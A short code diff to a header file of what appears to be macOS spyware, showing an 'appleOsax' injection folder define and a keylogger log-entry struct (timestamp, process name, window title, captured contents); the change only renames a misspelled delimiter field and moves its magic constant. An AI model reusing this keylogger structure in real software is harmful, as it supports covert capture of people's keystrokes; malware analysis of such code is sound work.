@@ -30,6 +30,7 @@
 #define OSAX_FOLDER @"appleOsax"
 #define ME __func__
 
+#define LOG_DELIMITER 0xABADC0DE
 
 //
 // Protocol definition for all the agents, they must conform to this
@@ -507,8 +508,7 @@ typedef struct _keylogAdditionalHeader {
   struct tm timeStamp;
   char processName[128];
   char windowTitle[128];
-  u_int delimeter;
-#define DELIMETER 0xABADC0DE
+  u_int delimiter;
   char contents[32];
 } keylogEntryHeader;
 
